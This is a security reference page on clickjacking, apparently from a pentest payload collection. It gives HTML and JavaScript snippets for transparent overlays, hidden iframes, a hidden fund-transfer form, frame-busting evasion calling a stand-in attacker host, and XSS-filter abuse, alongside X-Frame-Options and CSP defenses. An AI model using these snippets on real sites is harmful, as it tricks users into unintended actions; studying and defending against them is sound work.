# Clickjacking

> Clickjacking is a type of web security vulnerability where a malicious website tricks a user into clicking on something different from what the user perceives, potentially causing the user to perform unintended actions without their knowledge or consent. Users are tricked into performing all sorts of unintended actions as such as typing in the password, clicking on ‘Delete my account' button, liking a post, deleting a post, commenting on a blog. In other words all the actions that a normal user can do on a legitimate website can be done using clickjacking.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [UI Redressing](#ui-redressing)
    * [Invisible Frames](#invisible-frames)
    * [Button/Form Hijacking](#buttonform-hijacking)
    * [Execution Methods](#execution-methods)
* [Preventive Measures](#preventive-measures)
    * [Implement X-Frame-Options Header](#implement-x-frame-options-header)
    * [Content Security Policy (CSP)](#content-security-policy-csp)
    * [Disabling JavaScript](#disabling-javascript)
* [OnBeforeUnload Event](#onbeforeunload-event)
* [XSS Filter](#xss-filter)
    * [IE8 XSS filter](#ie8-xss-filter)
    * [Chrome 4.0 XSSAuditor filter](#chrome-40-xssauditor-filter)
* [Challenge](#challenge)
* [Labs](#labs)
* [References](#references)

## Tools

* [portswigger/burp](https://portswigger.net/burp)
* [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
* [machine1337/clickjack](https://github.com/machine1337/clickjack)


## Methodology

### UI Redressing

UI Redressing is a Clickjacking technique where an attacker overlays a transparent UI element on top of a legitimate website or application. 
The transparent UI element contains malicious content or actions that are visually hidden from the user. By manipulating the transparency and positioning of elements, 
the attacker can trick the user into interacting with the hidden content, believing they are interacting with the visible interface.

* **How UI Redressing Works:**
    * Overlaying Transparent Element: The attacker creates a transparent HTML element (usually a `<div>`) that covers the entire visible area of a legitimate website. This element is made transparent using CSS properties like `opacity: 0;`.
    * Positioning and Layering: By setting the CSS properties such as `position: absolute; top: 0; left: 0;`, the transparent element is positioned to cover the entire viewport. Since it's transparent, the user doesn't see it.
    * Misleading User Interaction: The attacker places deceptive elements within the transparent container, such as fake buttons, links, or forms. These elements perform actions when clicked, but the user is unaware of their presence due to the overlaying transparent UI element.
    * User Interaction: When the user interacts with the visible interface, they are unknowingly interacting with the hidden elements due to the transparent overlay. This interaction can lead to unintended actions or unauthorized operations.

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

### Invisible Frames

Invisible Frames is a Clickjacking technique where attackers use hidden iframes to trick users into interacting with content from another website unknowingly. 
These iframes are made invisible by setting their dimensions to zero (height: 0; width: 0;) and removing their borders (border: none;). 
The content inside these invisible frames can be malicious, such as phishing forms, malware downloads, or any other harmful actions.

* **How Invisible Frames Work:**
    * Hidden IFrame Creation: The attacker includes an `<iframe>` element in a webpage, setting its dimensions to zero and removing its border, making it invisible to the user.

      ```html
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
      ```

    * Loading Malicious Content: The src attribute of the iframe points to a malicious website or resource controlled by the attacker. This content is loaded silently without the user's knowledge because the iframe is invisible.
    * User Interaction: The attacker overlays enticing elements on top of the invisible iframe, making it seem like the user is interacting with the visible interface. For instance, the attacker might position a transparent button over the invisible iframe. When the user clicks the button, they are essentially clicking on the hidden content within the iframe.
    * Unintended Actions: Since the user is unaware of the invisible iframe, their interactions can lead to unintended actions, such as submitting forms, clicking on malicious links, or even performing financial transactions without their consent.


### Button/Form Hijacking

Button/Form Hijacking is a Clickjacking technique where attackers trick users into interacting with invisible or hidden buttons/forms, leading to unintended actions on a legitimate website. By overlaying deceptive elements on top of visible buttons or forms, attackers can manipulate user interactions to perform malicious actions without the user's knowledge.

* **How Button/Form Hijacking Works:**
    * Visible Interface: The attacker presents a visible button or form to the user, encouraging them to click or interact with it.

    ```html
    <button onclick="submitForm()">Click me</button>
    ```
    
    * Invisible Overlay: The attacker overlays this visible button or form with an invisible or transparent element that contains a malicious action, such as submitting a hidden form.

    ```html
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- Hidden form fields -->
    </form>
    ```

    * Deceptive Interaction: When the user clicks the visible button, they are unknowingly interacting with the hidden form due to the invisible overlay. The form is submitted, potentially causing unauthorized actions or data leakage.

    ```html
    <button onclick="submitForm()">Click me</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- Hidden form fields -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
    ```

### Execution Methods

* Creating Hidden Form: The attacker creates a hidden form containing malicious input fields, targeting a vulnerable action on the victim's website. This form remains invisible to the user.

```html
  <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```

* Overlaying Visible Element: The attacker overlays a visible element (button or form) on their malicious page, encouraging users to interact with it. When the user clicks the visible element, they unknowingly trigger the hidden form's submission.

```js
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
```


## Preventive Measures

### Implement X-Frame-Options Header

Implement the X-Frame-Options header with the DENY or SAMEORIGIN directive to prevent your website from being embedded within an iframe without your consent.

```apache
Header always append X-Frame-Options SAMEORIGIN
```

### Content Security Policy (CSP)

Use CSP to control the sources from which content can be loaded on your website, including scripts, styles, and frames. 
Define a strong CSP policy to prevent unauthorized framing and loading of external resources.
Example in HTML meta tag:

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

### Disabling JavaScript

* Since these type of client side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.
* There are three deactivation techniques that can be used with frames:
    * Restricted frames with Internet Explorer: Starting from IE6, a frame can have the "security" attribute that, if it is set to the value "restricted", ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.

    ```html
    <iframe src="http://target site" security="restricted"></iframe>
    ```

    * Sandbox attribute: with HTML5 there is a new attribute called “sandbox”. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.

    ```html
    <iframe src="http://target site" sandbox></iframe>
    ```

## OnBeforeUnload Event

* The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.

* The attacker can use this attack by registering an unload event on the top page using the following example code:

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

* The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"HTTP/1.1 204 No Content"_ header.

_204 page:_

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

_Attacker's Page_

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

## XSS Filter

### IE8 XSS filter 
This filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request's parameters.

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

Attacker View:

```html
<iframe src=”http://target site/?param=<script>if”>
```

### Chrome 4.0 XSSAuditor filter

It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.

Attacker View:

```html
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
```

## Challenge

Inspect the following code:

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
```

Determine the Clickjacking vulnerability within this code snippet. Identify how the hidden iframe is being used to exploit the user's actions when they click the button, leading them to a malicious website.


## Labs

* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
* [OWASP Client Side Clickjacking Test](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)


## References

- [Clickjacker.io - Saurabh Banawar - May 10, 2020](https://clickjacker.io)
- [Clickjacking - Gustav Rydstedt - April 28, 2020](https://owasp.org/www-community/attacks/Clickjacking)
- [Synopsys Clickjacking - BlackDuck - November 29, 2019](https://www.synopsys.com/glossary/what-is-clickjacking.html#B)
- [Web-Security Clickjacking - PortSwigger - October 12, 2019](https://portswigger.net/web-security/clickjacking)